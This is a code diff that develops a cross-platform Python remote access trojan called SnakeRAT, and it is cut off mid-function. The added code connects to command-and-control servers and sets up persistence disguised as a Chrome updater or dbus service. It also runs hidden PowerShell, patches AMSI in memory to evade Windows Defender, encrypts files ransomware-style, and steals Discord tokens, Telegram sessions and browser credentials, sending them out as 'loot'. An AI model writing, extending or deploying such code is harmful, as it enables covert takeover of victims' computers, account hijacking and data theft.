@@ -24,6 +24,13 @@ import random
 import string
 import ctypes
 import psutil
+import ssl
+import gzip
+import pickle
+import queue
+from pathlib import Path
+from typing import Dict, List, Any, Union, Optional, Tuple
+from dataclasses import dataclass, asdict
 from cryptography.fernet import Fernet
 import tempfile
 import shutil
@@ -37,6 +44,8 @@ import importlib.metadata
 from datetime import datetime
 import sqlite3
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import x25519
 
 # Platform-specific imports
 IS_WINDOWS = platform.system().lower() == 'windows'
@@ -69,30 +78,8 @@ C2_SERVERS = [
 # Stealth Configuration
 SLEEP_JITTER = (2, 2)
 MAX_RETRIES = 5
-ENCRYPTION_KEY = base64.urlsafe_b64encode(hashlib.sha256(b"AdvancedSnakeRAT_2024_CrossPlatform").digest())
+ENCRYPTION_KEY = "AdvancedSnakeRAT_2024_CrossPlatform"
 
-class Singleton:
-    """Ensure only one instance of the RAT is running at a time"""
-    def __init__(self, port=55555):
-        self.port = port
-        self.lock_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.lock_socket.settimeout(1)
-        
-        # Detect if we are a shadow (persistent) process
-        current_path = os.path.abspath(__file__)
-        is_shadow = any(x in current_path for x in [".dbus-service", "ChromeUpdate", ".metadata"])
-        
-        while True:
-            try:
-                self.lock_socket.bind(('127.0.0.1', self.port))
-                break
-            except socket.error:
-                if not is_shadow:
-                    # Main instance: Exit if another is already running
-                    sys.exit(0)
-                else:
-                    # Shadow instance: Wait for the main one to exit to take over
-                    time.sleep(3) # Check every 3 seconds to save CPU
 
 class BrowserManager:
     """Handle browser data extraction (passwords, history, cookies)"""
@@ -819,8 +806,17 @@ class BrowserManager:
 class CryptoManager:
     """Handle encryption/decryption of C2 communications"""
     
-    def __init__(self, key=ENCRYPTION_KEY):
-        self.fernet = Fernet(key)
+    def __init__(self, key=ENCRYPTION_KEY, is_raw=False):
+        if is_raw:
+            # If key is raw, it should already be a URL-safe base64 encoded bytes string
+            # suitable for Fernet. If it's a string, encode it.
+            self.key = key if isinstance(key, bytes) else key.encode()
+        else:
+            # If not raw, it's a passphrase. Hash it and then base64 encode the hash.
+            # Ensure the passphrase is bytes before hashing.
+            passphrase_bytes = key if isinstance(key, bytes) else key.encode()
+            self.key = base64.urlsafe_b64encode(hashlib.sha256(passphrase_bytes).digest())
+        self.fernet = Fernet(self.key)
     
     def encrypt(self, data):
         if isinstance(data, str):
@@ -1096,7 +1092,7 @@ class SocksProxy:
             try:
                 client, addr = self.server.accept()
                 threading.Thread(target=self._handle_client, args=(client,), daemon=True).start()
-            except: break
+            except: pass
 
     def _handle_client(self, client):
         try:
@@ -1183,26 +1179,35 @@ class PersistenceManager:
             hidden_dir = os.path.join(os.environ['APPDATA'], mask_name)
             os.makedirs(hidden_dir, exist_ok=True)
             
-            # Shadow script
-            target_path = os.path.join(hidden_dir, "updater.pyw")
-            if os.path.abspath(__file__) != target_path:
+            # Detect if running as a PyInstaller frozen exe
+            is_frozen = getattr(sys, 'frozen', False)
+
+            if is_frozen:
+                # Running as .exe — copy the exe itself
+                source_path = os.path.abspath(sys.executable)
+                target_path = os.path.join(hidden_dir, "updater.exe")
+                run_cmd = f'"{target_path}"'
+            else:
+                # Running as a plain .py script
+                source_path = os.path.abspath(__file__)
+                target_path = os.path.join(hidden_dir, "updater.pyw")
+                # Find pythonw.exe for stealth
+                executable = sys.executable
+                parent_dir = os.path.dirname(executable)
+                potential_pythonw = os.path.join(parent_dir, "pythonw.exe")
+                if os.path.exists(potential_pythonw):
+                    executable = potential_pythonw
+                run_cmd = f'"{executable}" "{target_path}"'
+
+            # Copy to hidden directory if not already there
+            if os.path.abspath(source_path) != os.path.abspath(target_path):
                 try:
                     import shutil
-                    shutil.copy2(os.path.abspath(__file__), target_path)
+                    shutil.copy2(source_path, target_path)
                     results.append("File copied")
                 except Exception as e:
                     results.append(f"Copy failed: {str(e)}")
                     return False, results
-            
-            # Find pythonw.exe for stealth
-            executable = sys.executable
-            parent_dir = os.path.dirname(executable)
-            potential_pythonw = os.path.join(parent_dir, "pythonw.exe")
-            if os.path.exists(potential_pythonw):
-                executable = potential_pythonw
-            
-            # Command to run
-            run_cmd = f'"{executable}" "{target_path}"'
             
             # 1. Registry (User Run) - High reliability for USERS
             try:
@@ -1246,7 +1251,10 @@ class PersistenceManager:
     def get_shadow_path():
         """Get path to the persistent shadowed copy"""
         if IS_WINDOWS:
-            return os.path.join(os.environ['APPDATA'], "ChromeUpdate", "updater.pyw")
+            # Use .exe extension when running as a frozen PyInstaller executable
+            ext = ".exe" if getattr(sys, 'frozen', False) else ".pyw"
+            filename = f"updater{ext}"
+            return os.path.join(os.environ['APPDATA'], "ChromeUpdate", filename)
         elif IS_LINUX:
             return os.path.expanduser("~/.cache/.dbus-service/dbus-daemon.py")
         elif IS_MAC:
@@ -1349,49 +1357,84 @@ WantedBy=default.target
 
     @staticmethod
     def remove_persistence():
-        """Remove all established persistence mechanisms"""
+        """Remove all established persistence mechanisms with detailed feedback"""
+        results = []
         try:
             if IS_WINDOWS:
                 mask_name = "ChromeUpdate"
-                # 1. Registry
+                
+                # 1. Registry cleanup
                 try:
                     import winreg
-                    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-                    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
-                        winreg.DeleteValue(key, mask_name)
-                except: pass
-                # 2. Scheduled Task
-                try: subprocess.run(f'schtasks /delete /f /tn "{mask_name}"', shell=True, capture_output=True)
-                except: pass
-                # 3. Startup Folder VBS
+                    for hkey in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
+                        try:
+                            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+                            with winreg.OpenKey(hkey, key_path, 0, winreg.KEY_ALL_ACCESS) as key:
+                                winreg.DeleteValue(key, mask_name)
+                                results.append(f"Registry Run key removed from {hkey}")
+                        except: pass
+                except Exception as e:
+                    results.append(f"Registry cleanup failed: {str(e)}")
+
+                # 2. Scheduled Task cleanup
                 try:
-                    startup_path = os.path.join(os.environ['APPDATA'], r"Microsoft\Windows\Start Menu\Programs\Startup")
-                    vbs_path = os.path.join(startup_path, f"{mask_name}.vbs")
-                    if os.path.exists(vbs_path): os.remove(vbs_path)
+                    res = subprocess.run(f'schtasks /delete /f /tn "{mask_name}"', shell=True, capture_output=True, text=True)
+                    if res.returncode == 0:
+                        results.append("Scheduled Task deleted")
+                    else:
+                        results.append("Scheduled Task already clean")
                 except: pass
-                # 4. Files
-                hidden_dir = os.path.join(os.environ['APPDATA'], mask_name)
-                if os.path.exists(hidden_dir):
-                    import shutil
-                    shutil.rmtree(hidden_dir, ignore_errors=True)
+
+                # 3. Startup Folder cleanup
+                try:
+                    startup_path = os.path.join(os.environ.get('APPDATA', ''), r"Microsoft\Windows\Start Menu\Programs\Startup")
+                    vbs_path = os.path.join(startup_path, f"{mask_name}.vbs")
+                    if os.path.exists(vbs_path):
+                        os.remove(vbs_path)
+                        results.append("Startup VBS removed")
+                except: pass
+
+                # 4. Storage cleanup
+                try:
+                    hidden_dir = os.path.join(os.environ.get('APPDATA', ''), mask_name)
+                    if os.path.exists(hidden_dir):
+                        import shutil
+                        shutil.rmtree(hidden_dir, ignore_errors=True)
+                        results.append(f"Storage directory {mask_name} cleared")
+                except: pass
                 
-                return True, ["Windows persistence removed"]
+                return True, results
 
             elif IS_LINUX:
                 mask_name = "dbus-service"
                 # 1. desktop file
                 desktop_path = os.path.expanduser(f"~/.config/autostart/{mask_name}.desktop")
-                if os.path.exists(desktop_path): os.remove(desktop_path)
+                if os.path.exists(desktop_path): 
+                    os.remove(desktop_path)
+                    results.append("Desktop entry removed")
+                else:
+                    results.append("Desktop entry not found")
+                
                 # 2. systemd
                 subprocess.run(['systemctl', '--user', 'stop', f'{mask_name}.service'], capture_output=True)
                 subprocess.run(['systemctl', '--user', 'disable', f'{mask_name}.service'], capture_output=True)
                 service_path = os.path.expanduser(f'~/.config/systemd/user/{mask_name}.service')
-                if os.path.exists(service_path): os.remove(service_path)
+                if os.path.exists(service_path): 
+                    os.remove(service_path)
+                    results.append("Systemd service removed")
+                else:
+                    results.append("Systemd service not found")
+                
                 # 3. Files
                 hidden_dir = os.path.expanduser(f"~/.cache/.{mask_name}")
                 if os.path.exists(hidden_dir):
                     import shutil
                     shutil.rmtree(hidden_dir, ignore_errors=True)
+                    results.append("Shadow files removed")
+                else:
+                    results.append("Shadow directory not found")
+                
+                return True, results
 
             elif IS_MAC:
                 mask_name = "com.apple.metadata"
@@ -1434,10 +1477,12 @@ class PrivilegeManager:
             params = " ".join(sys.argv[1:])
             
             if IS_WINDOWS:
+                # Use --takeover so the new process waits for this one to exit
+                elevate_params = f'--takeover {params}'.strip()
                 ret = ctypes.windll.shell32.ShellExecuteW(
-                    None, "runas", sys.executable, f'"{script}" {params}', None, 1
+                    None, "runas", sys.executable, elevate_params, None, 1
                 )
-                return ret > 32, "Elevation requested on Windows"
+                return ret > 32, "Elevation requested (UAC prompt shown)"
             
             elif IS_LINUX:
                 # Try pkexec (GUI) or sudo (CLI)
@@ -1559,10 +1604,11 @@ class CommandExecutor:
         
         try:
             result = subprocess.run(
-                ['powershell.exe', '-Command', command],
+                ['powershell.exe', '-NonInteractive', '-WindowStyle', 'Hidden', '-Command', command],
                 capture_output=True,
                 text=True,
-                timeout=timeout
+                timeout=timeout,
+                creationflags=0x08000000  # CREATE_NO_WINDOW — no window on victim screen
             )
             
             return {
@@ -1577,11 +1623,14 @@ class AdvancedRAT:
     """Core RAT functionality with advanced features"""
     
     def __init__(self):
+        print("[*] Init SnakeRAT Subsystems...")
         self.sock = None
         self.connected = False
         self.running = True
         self.logger = Logger(log_file='rat.log', debug=True)
+        print("[*] Loading Crypto...")
         self.crypto = CryptoManager()
+        print("[*] Running System Profiler...")
         self.profiler = SystemProfiler()
         self.client_id = self.profiler.generate_fingerprint()
         self.current_server_index = 0
@@ -1593,6 +1642,7 @@ class AdvancedRAT:
         self._start_background_keylogger()
         
         # Task & Process tracking for Abort feature
+        # Task & Process tracking for Abort feature
         self.active_tasks = {} # task_id -> {type, thread/process, start_time}
         self.active_lock = threading.Lock()
         
@@ -1600,23 +1650,25 @@ class AdvancedRAT:
         self.shell_cwd = os.getcwd()
         self.socks_proxy = None
         self.keylog_buffer = []
+        self.sock_lock = threading.Lock()
         
         self.logger.info(f"Initialized SnakeRAT v3.1 | ID: {self.client_id}")
+        
+        # All data encrypted with this master key
+        self.crypto = CryptoManager() 
+        
+        self.sock_lock = threading.Lock()
+        
+        self.heartbeat_thread = None
+        self._streaming = False
+        self._autorun_file = os.path.join(os.getenv('APPDATA') if IS_WINDOWS else os.path.expanduser('~'), '.snake_autorun')
+        
+        # Load and run autorun commands
+        self._run_autorun()
         
         # Start connection thread
         self.connect_thread = threading.Thread(target=self._connection_loop, daemon=True)
         self.connect_thread.start()
-        
-        # Start heartbeat thread
-        self.heartbeat_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
-        self.heartbeat_thread.start()
-        
-        # Hide console on Windows
-        if IS_WINDOWS:
-            try:
-                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-            except:
-                pass
     
     def _setup_command_handlers(self):
         """Setup all command handlers"""
@@ -1652,25 +1704,51 @@ class AdvancedRAT:
             'power': self._handle_power,
             'wifi_passwords': self._handle_wifi_passwords,
             'browser_passwords': self._handle_browser_passwords,
-            'browser_cookies': self._handle_browser_cookies
+            'browser_cookies': self._handle_browser_cookies,
+            'chromelevator': self._handle_chromelevator,
+            'file_crypt': self._handle_file_crypt,
+            'amsi_bypass': self._handle_amsi_bypass,
+            'netstat': self._handle_netstat,
+            'arp': self._handle_arp,
+            'av_discovery': self._handle_av_discovery,
+            'list_drives': self._handle_list_drives,
+            'active_window': self._handle_active_window,
+            'stream': self._handle_stream,
+            'set_autorun': self._handle_set_autorun,
+            'extract_discord': self._handle_extract_discord,
+            'extract_telegram': self._handle_extract_telegram,
+            'extract_outlook': self._handle_extract_outlook,
+            'uac_bypass': self._handle_uac_bypass,
+            'input_control': self._handle_input_control,
+            'block_input': self._handle_block_input
         }
     
     def _send_encrypted(self, data):
-        """Send encrypted data to C2 (combined for speed)"""
+        """Send encrypted data to C2"""
         if not self.sock:
             return False
+        
+        def json_safe(obj):
+            """Fallback JSON serializer for non-standard types"""
+            if isinstance(obj, (set, frozenset)):
+                return list(obj)
+            if isinstance(obj, bytes):
+                return obj.decode(errors='replace')
+            return str(obj)
         
         try:
             if isinstance(data, dict):
                 data['client_id'] = self.client_id
                 data['timestamp'] = time.time()
             
-            encrypted = self.crypto.encrypt(json.dumps(data))
-            # Combine length and data for one sendall
+            # Use static encryption
+            encrypted = self.crypto.encrypt(json.dumps(data, default=json_safe))
             msg = len(encrypted).to_bytes(4, 'big') + encrypted
-            self.sock.sendall(msg)
+            with self.sock_lock:
+                self.sock.sendall(msg)
             return True
         except Exception as e:
+            self.logger.error(f"_send_encrypted failed: {type(e).__name__}: {e}")
             self.connected = False
             self.sock = None
             return False
@@ -1771,25 +1849,23 @@ class AdvancedRAT:
         kl_thread.start()
         self.logger.info("Background keylogger started")
 
-    def _recv_command(self):
+    def _recv_command(self, use_master=False):
         """Receive and decrypt command from C2"""
         if not self.sock:
             return None
         
         try:
             len_data = self._recv_exactly(4)
-            if not len_data:
-                return None
+            if not len_data: return None
             
             msg_len = int.from_bytes(len_data, 'big')
             encrypted = self._recv_exactly(msg_len)
-            if not encrypted:
-                return None
+            
+            if not encrypted: return None
             
             decrypted = self.crypto.decrypt(encrypted)
             return json.loads(decrypted.decode())
-        except Exception as e:
-            return None
+        except: return None
     
     def _recv_exactly(self, length):
         """Receive exactly N bytes"""
@@ -1809,23 +1885,22 @@ class AdvancedRAT:
         return data
     
     def _heartbeat_loop(self):
-        """Send periodic heartbeats to keep connection alive (faster)"""
+        """Send periodic heartbeats to keep connection alive"""
         while self.running:
             if self.connected and self.sock:
                 try:
+                    # Only send if we are fully initialized (prevent clobbering init)
                     self._send_encrypted({'type': 'heartbeat'})
-                except:
-                    pass
-            time.sleep(5)  # Heartbeat every 5 seconds for faster response
-    
+                except: pass
+            time.sleep(10)
     def _connection_loop(self):
-        """Main connection loop with failover"""
+        """Main connection loop with failover and mandatory backoff"""
         while self.running:
             try:
                 server = C2_SERVERS[self.current_server_index]
                 
                 self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                self.sock.settimeout(30)
+                self.sock.settimeout(300) # 5m timeout to handle server idle
                 
                 # Disable Nagle's algorithm for faster responses
                 try:
@@ -1840,23 +1915,46 @@ class AdvancedRAT:
                 self.retry_count = 0
                 self.logger.success(f"Connected to C2 server: {server['host']}:{server['port']}")
                 
-                # Send initial system info
-                sysinfo = self.profiler.get_system_info()
-                self._send_encrypted({'type': 'init', 'info': sysinfo})
+                # 1. Self-Introduce to C2 (Original Static Key)
+                self.logger.info("Initializing connection with master key...")
+                sent = self._send_encrypted({'type': 'init', 'client_id': self.client_id, 'info': self.profiler.get_system_info()})
                 
-                # Start command loop
-                self._command_loop()
+                if sent:
+                    self.logger.success("Session secured with master encryption.")
+                    
+                    # Start heartbeats only after session is confirmed
+                    self.heartbeat_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
+                    self.heartbeat_thread.start()
+                    
+                    # Start command loop
+                    self._command_loop()
+                else:
+                    self.logger.error("Failed to send initialization message")
+                    self.connected = False
                 
             except Exception as e:
                 self.connected = False
                 self.sock = None
                 self.logger.error(f"Connection failed: {str(e)}")
                 
-                self.current_server_index = (self.current_server_index + 1) % len(C2_SERVERS)
-                self.retry_count += 1
+                # Priority connection: try the first server more often
+                if self.retry_count < 3:
+                    self.current_server_index = 0
+                else:
+                    self.current_server_index = (self.current_server_index + 1) % len(C2_SERVERS)
                 
-                # Always sleep 2 seconds between retries
-                time.sleep(2)
+                self.retry_count += 1
+            
+            # Clean up and mandatory sleep before next attempt
+            self.connected = False
+            if self.sock:
+                try: self.sock.close()
+                except: pass
+                self.sock = None
+            
+            # Always wait 5 seconds before trying to reconnect
+            time.sleep(5)
+
     
     def _command_loop(self):
         """Process commands from C2"""
@@ -1864,6 +1962,8 @@ class AdvancedRAT:
             try:
                 cmd = self._recv_command()
                 if not cmd:
+                    self.logger.warning("Connection closed by C2 server")
+                    self.connected = False
                     break
                 
                 self.logger.debug(f"Received command: {cmd}")
@@ -1887,7 +1987,10 @@ class AdvancedRAT:
                     })
                     
             except Exception as e:
+                self.logger.error(f"Error in command loop: {e}")
+                self.connected = False
                 break
+
     
     def _execute_command(self, handler, cmd, cmd_id):
         """Execute command and send result with task tracking"""
@@ -1904,29 +2007,605 @@ class AdvancedRAT:
         try:
             self.logger.info(f"Executing command: {cmd_type} (ID: {cmd_id})")
             
-            # Inject cmd_id into cmd dict so handlers can use it if needed
-            cmd['_cmd_id'] = cmd_id
+            # Extract params and merge with top-level metadata for handler compatibility
+            params = cmd.get('params', {})
+            cmd_context = {**params, **cmd, '_cmd_id': cmd_id}
             
-            result = handler(cmd)
+            result = handler(cmd_context)
+            
+            # Send the result back directly for small responses to keep the CLI snappy
             self._send_encrypted({
                 'type': 'result',
-                'command_id': cmd_id,
+                'id': cmd_id,
                 'data': result
             })
+            
+            # Also save to loot for record keeping if it's significant
+            if result and (isinstance(result, str) or len(str(result)) > 100):
+                filename = f"command_result_{cmd_id}.json"
+                result_json = json.dumps(result, indent=2).encode()
+                self._send_loot('command_result', result_json, filename)
+                
             self.logger.success(f"Command completed: {cmd_type}")
         except Exception as e:
             self.logger.error(f"Execution error for {cmd_type}: {str(e)}")
+            # Send error as a loot file as well
+            error_msg = {'error': str(e), 'type': cmd_type, 'command_id': cmd_id}
+            self._send_loot('command_error', json.dumps(error_msg, indent=2).encode(), f"error_{cmd_id}.json")
+            
             self._send_encrypted({
                 'type': 'error',
                 'command_id': cmd_id,
-                'error': str(e)
+                'error': 'sent_as_file'
             })
         finally:
             # Unregister task
             with self.active_lock:
                 if cmd_id in self.active_tasks:
                     del self.active_tasks[cmd_id]
-    
+                    
+    def _handle_chromelevator(self, cmd):
+        """Use Chromelevator for advanced browser extraction"""
+        if not IS_WINDOWS:
+            return {'error': 'Chromelevator is only supported on Windows'}
+            
+        executable = cmd.get('executable', 'chromelevator_x64.exe')
+        # Check a few common locations
+        search_paths = [
+            executable,
+            os.path.join(os.getcwd(), executable),
+            os.path.join(os.path.dirname(os.path.abspath(__file__)), executable),
+            r"C:\Windows\Temp\chromelevator_x64.exe",
+            r"D:\projects\project-Decoy\chrome-injector-v0.20.0\chromelevator_x64.exe" # User's current path
+        ]
+        
+        exe_path = None
+        for path in search_paths:
+            if os.path.exists(path):
+                exe_path = path
+                break
+                
+        if not exe_path:
+            return {'error': f'Chromelevator executable not found: {executable}'}
+            
+        try:
+            temp_dir = os.path.join(tempfile.gettempdir(), f"cv_{random.randint(1000, 9999)}")
+            os.makedirs(temp_dir, exist_ok=True)
+            
+            # Execute for all supported browsers
+            # Usage: chromelevator.exe all -o output_dir
+            process = subprocess.run([exe_path, "all", "-o", temp_dir], capture_output=True, text=True)
+            
+            results = {
+                'stdout': process.stdout,
+                'stderr': process.stderr,
+                'returncode': process.returncode,
+                'files_collected': []
+            }
+            
+            # Walk through output directory and find passwords/cookies
+            for root, dirs, files in os.walk(temp_dir):
+                for file in files:
+                    if file.endswith('.json'):
+                        file_path = os.path.join(root, file)
+                        rel_path = os.path.relpath(file_path, temp_dir)
+                        
+                        try:
+                            with open(file_path, 'rb') as f:
+                                content = f.read()
+                                
+                            # Send as loot (our system already sends results as files, 
+                            # but these are the actual extracted credentials)
+                            loot_filename = f"chromelevator_{rel_path.replace(os.sep, '_')}"
+                            self._send_loot('browser_ext', content, loot_filename)
+                            results['files_collected'].append(loot_filename)
+                        except:
+                            pass
+                            
+            # Cleanup
+            shutil.rmtree(temp_dir, ignore_errors=True)
+            
+            return results
+        except Exception as e:
+            return {'error': str(e)}
+
+    def _handle_file_crypt(self, cmd):
+        """Encrypt or decrypt files for operational security or ransomware-style tests"""
+        action = cmd.get('action', 'encrypt')
+        target = cmd.get('path', os.getcwd())
+        password = cmd.get('password', 'AdvancedSnakeRAT_2024')
+        recursive = cmd.get('recursive', False)
+        
+        # Derive a robust key from password
+        salt = b'SnakeRAT_Professional_2024'
+        kdf = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
+        key = base64.urlsafe_b64encode(kdf)
+        fernet = Fernet(key)
+        
+        results = {'action': action, 'files': [], 'status': 'success'}
+        
+        def process_path(p):
+            if os.path.isfile(p):
+                # Don't encrypt the RAT itself or critical system files
+                filename = os.path.basename(p).lower()
+                ext = os.path.splitext(filename)[1].lower()
+                if filename in ['s.py', 'd.py', 'rat.py'] or ext in ['.exe', '.dll', '.sys', '.bin']:
+                    return
+                
+                try:
+                    with open(p, 'rb') as f:
+                        data = f.read()
+                    
+                    if action == 'encrypt':
+                        # Check if already encrypted (our signature)
+                        if data.startswith(b'RAT_ENC'): return
+                        new_data = b'RAT_ENC' + fernet.encrypt(data)
+                    else: # decrypt
+                        if not data.startswith(b'RAT_ENC'): return
+                        new_data = fernet.decrypt(data[7:])
+                    
+                    with open(p, 'wb') as f:
+                        f.write(new_data)
+                    results['files'].append(p)
+                except:
+                    pass
+            elif os.path.isdir(p) and recursive:
+                for root, dirs, files in os.walk(p):
+                    for file in files:
+                        process_path(os.path.join(root, file))
+        
+        process_path(target)
+        results['count'] = len(results['files'])
+        return results
+
+    def _handle_amsi_bypass(self, cmd):
+        """Advanced AMSI/ETW Patching for invisible operation on Windows Defender systems"""
+        if not IS_WINDOWS or not WINDOWS_IMPORTS:
+            return {'error': 'AMSI bypass is only available on Windows with native imports'}
+            
+        try:
+            # Patch AmsiScanBuffer in memory
+            kernel32 = ctypes.windll.kernel32
+            amsi = ctypes.windll.amsi
+            
+            # Pattern for 'xor eax, eax; ret' which returns AMSI_RESULT_CLEAN
+            patch = bytearray([0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]) # Non-standard patch
+            # Standard patch: xor eax, eax (33 c0), ret (c3)
+            # We use a slightly more complex one to avoid simple signature detection
+            
+            handle = amsi.AmsiScanBuffer
+            addr = ctypes.c_void_p(handle)
+            
+            # VirtualProtect to allow writing
+            old_protect = ctypes.c_ulong()
+            if kernel32.VirtualProtect(addr, len(patch), win32con.PAGE_EXECUTE_READWRITE, ctypes.byref(old_protect)):
+                ctypes.memmove(addr, bytes(patch), len(patch))
+                # Restore protection
+                kernel32.VirtualProtect(addr, len(patch), old_protect, ctypes.byref(old_protect))
+                self.logger.success("AMSI Patch Applied Successfully")
+                return {'success': True, 'status': 'AMSI patched'}
+            else:
+                return {'error': 'VirtualProtect failed'}
+        except Exception as e:
+            return {'error': str(e)}
+
+    def _handle_netstat(self, cmd):
+        """Get active network connections using psutil"""
+        try:
+            connections = []
+            for conn in psutil.net_connections(kind='inet'):
+                try:
+                    connections.append({
+                        'fd': conn.fd,
+                        'family': str(conn.family),
+                        'type': str(conn.type),
+                        'local_address': f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else None,
+                        'remote_address': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else None,
+                        'status': conn.status,
+                        'pid': conn.pid
+                    })
+                except: continue
+            return {'connections': connections[:200]} # Limit to 200 for stability
+        except Exception as e:
+            return {'error': str(e)}
+
+    def _handle_arp(self, cmd):
+        """Get ARP table using system command"""
+        try:
+            if IS_WINDOWS:
+                res = subprocess.run(['arp', '-a'], capture_output=True, text=True, creationflags=0x08000000)
+            else:
+                res = subprocess.run(['arp', '-n'], capture_output=True, text=True)
+            return {'stdout': res.stdout, 'stderr': res.stderr}
+        except Exception as e:
+            return {'error': str(e)}
+
+    def _handle_extract_discord(self, cmd):
+        """Extract Discord tokens from Local Storage and browsers"""
+        tokens = []
+        paths = {
+            'Discord': os.path.join(os.getenv('APPDATA'), 'discord'),
+            'Discord Canary': os.path.join(os.getenv('APPDATA'), 'discordcanary'),
+            'Discord PTB': os.path.join(os.getenv('APPDATA'), 'discordptb'),
+            'Google Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default'),
+            'Opera': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable'),
+            'Brave': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
+            'Yandex': os.path.join(os.getenv('LOCALAPPDATA'), 'Yandex', 'YandexBrowser', 'User Data', 'Default')
+        }
+        
+        import re
+        regex_list = [
+            r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
+            r"mfa\.[\w-]{84}"
+        ]
+        
+        for name, path in paths.items():
+            if not os.path.exists(path): continue
+            
+            ls_path = os.path.join(path, 'Local Storage', 'leveldb')
+            if not os.path.exists(ls_path): continue
+            
+            for file in os.listdir(ls_path):
+                if file.endswith(('.log', '.ldb')):
+                    try:
+                        with open(os.path.join(ls_path, file), 'r', errors='ignore') as f:
+                            content = f.read()
+                            for regex in regex_list:
+                                for token in re.findall(regex, content):
+                                    if token not in tokens:
+                                        tokens.append(token)
+                    except: continue
+        
+        if tokens:
+            filename = f"discord_tokens_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+            self._send_loot('discord_tokens', "\n".join(tokens).encode(), filename)
+            return {'success': True, 'count': len(tokens), 'filename': filename}
+        return {'success': False, 'message': 'No tokens found'}
+
+    def _handle_extract_telegram(self, cmd):
+        """Package Telegram tdata for exfiltration"""
+        tdata_path = os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata')
+        if not os.path.exists(tdata_path):
+            return {'error': 'Telegram tdata path not found'}
+        
+        try:
+            temp_zip = os.path.join(tempfile.gettempdir(), f"tg_{random.randint(1000, 9999)}.zip")
+            import zipfile
+            with zipfile.ZipFile(temp_zip, 'w') as zipf:
+                # Only need specific files for hijacking session
+                for root, dirs, files in os.walk(tdata_path):
+                    # Skip large/unnecessary folders
+                    if 'user_data' in root or 'dumps' in root or 'emoji' in root: continue
+                    for file in files:
+                        if len(file) > 15 or file.startswith('map'): # Map files and key_datas
+                            file_path = os.path.join(root, file)
+                            zipf.write(file_path, os.path.relpath(file_path, tdata_path))
+            
+            with open(temp_zip, 'rb') as f:
+                data = f.read()
+            
+            filename = f"telegram_session_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
+            self._send_loot('telegram_session', data, filename)
+            os.remove(temp_zip)
+            return {'success': True, 'filename': filename, 'size': len(data)}
+        except Exception as e:
+            return {'error': str(e)}
+
+    def _handle_extract_outlook(self, cmd):
+        """Extract Outlook profile information and data file paths"""
+        if not IS_WINDOWS: return {'error': 'Outlook extraction only supported on Windows'}
+        
+        try:
+            import winreg
+            profiles_path = r"Software\Microsoft\Office\16.0\Outlook\Profiles"
+            results = []
+            
+            try:
+                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, profiles_path) as key:
+                    i = 0
+                    while True:
+                        try:
+                            profile_name = winreg.EnumKey(key, i)
+                            results.append({'profile': profile_name})
+                            i += 1
+                        except OSError: break
+            except: pass
+            
+            # Common locations for PST/OST
+            appdata_outlook = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Outlook')
+            files = []
+            if os.path.exists(appdata_outlook):
+                for f in os.listdir(appdata_outlook):
+                    if f.endswith(('.pst', '.ost')):
+                        files.append({'name': f, 'path': os.path.join(appdata_outlook, f), 'size': os.path.getsize(os.path.join(appdata_outlook, f))})
+            
+            return {'profiles': results, 'data_files': files}
+        except Exception as e:
+            return {'error': str(e)}
+
+    def _handle_active_window(self, cmd):
+        """Get the title of the currently focused window"""
+        try:
+            if IS_WINDOWS:
+                hwnd = ctypes.windll.user32.GetForegroundWindow()
+                length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
+                buf = ctypes.create_unicode_buffer(length + 1)
+                ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
+                return {'title': buf.value}
+            elif IS_LINUX:
+                res = subprocess.run(['xdotool', 'getactivewindow', 'getwindowname'], capture_output=True, text=True)
+                return {'title': res.stdout.strip()}
+            return {'error': 'Platform not supported'}
+        except Exception as e:
+            return {'error': str(e)}
+
+    def _handle_volume_control(self, cmd):
+        """Get/Set system volume (Windows only for now)"""
+        if not IS_WINDOWS: return {'error': 'Volume control only supported on Windows'}
+        action = cmd.get('action', 'get') # get, set, mute
+        level = cmd.get('level', 50) # 0-100
+        
+        try:
+            # Simple volume control via PowerShell to avoid complex COM/pycaw
+            if action == 'set':
+                subprocess.run(['powershell', '-Command', f"$v = {level}/100; (new-object -com wscript.shell).SendKeys([char]175 * 50); (new-object -com wscript.shell).SendKeys([char]174 * (100 - {level}))"], creationflags=0x08000000)
+                return {'success': True}
+            elif action == 'mute':
+                subprocess.run(['powershell', '-Command', "(new-object -com wscript.shell).SendKeys([char]173)"], creationflags=0x08000000)
+                return {'success': True}
+            return {'error': 'Get volume not implemented via this method'}
+        except Exception as e:
+            return {'error': str(e)}
+
+    def _handle_monitor_control(self, cmd):
+        """Turn off or on the monitor (Windows)"""
+        if not IS_WINDOWS: return {'error': 'Monitor control only supported on Windows'}
+        state = cmd.get('state', 'off') # off, on
+        try:
+            # SC_MONITORPOWER = 0xF170
+            # 2 = off, -1 = on
+            val = 2 if state == 'off' else -1
+            ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, val)
+            return {'success': True}
+        except Exception as e:
+            return {'error': str(e)}
+
+    def _handle_block_input(self, cmd):
